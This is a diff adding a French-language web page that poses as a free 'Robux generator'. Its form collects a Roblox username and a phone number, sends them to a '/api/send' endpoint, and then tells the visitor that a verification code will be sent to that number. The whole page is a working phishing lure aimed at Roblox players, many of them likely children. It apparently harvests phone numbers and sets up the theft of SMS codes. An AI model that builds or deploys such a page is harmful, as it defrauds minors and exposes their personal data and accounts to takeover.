@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Générateur de Robux</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      background: #0d1220;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+
+    .card {
+      width: 90%;
+      max-width: 420px;
+      background: #151d2d;
+      border-radius: 18px;
+      padding: 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.35);
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 12px;
+      margin-bottom: 8px;
+      color: #c8d4ef;
+      font-size: 0.9rem;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1px solid #2d3a55;
+      background: #0d1525;
+      color: white;
+      box-sizing: border-box;
+      font-size: 1rem;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 18px;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, #2f6ef7, #4cc9ff);
+      color: white;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .status {
+      margin-top: 14px;
+      min-height: 22px;
+      text-align: center;
+      color: #5df0ac;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Générateur de Robux !</h1>
+
+    <form id="form">
+      <label for="pseudo">Pseudo Roblox</label>
+      <input id="pseudo" type="text" placeholder="Entrez votre pseudo" required>
+
+      <label for="phone">Numéro de Téléphone</label>
+      <input id="phone" type="tel" placeholder="+33 6 12 34 56 78" required>
+
+      <label for="montant">Montant de Robux</label>
+      <select id="montant">
+        <option value="200">200</option>
+        <option value="500">500</option>
+        <option value="1000">1000</option>
+        <option value="2000">2000</option>
+      </select>
+
+      <button type="submit">Envoyer</button>
+      <div class="status" id="status"></div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('form');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const payload = {
+        pseudo: document.getElementById('pseudo').value,
+        phone: document.getElementById('phone').value,
+        montant: document.getElementById('montant').value
+      };
+
+      status.textContent = 'Envoi...';
+
+      try {
+        const response = await fetch('/api/send', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+
+        if (result.ok) {
+          status.textContent = 'un code de verification sera envoyé sur votre numero';
+        } else {
+          status.textContent = 'Erreur lors de l’envoi';
+        }
+      } catch (error) {
+        status.textContent = 'Erreur réseau';
+      }
+    });
+  </script>
+</body>
+</html>
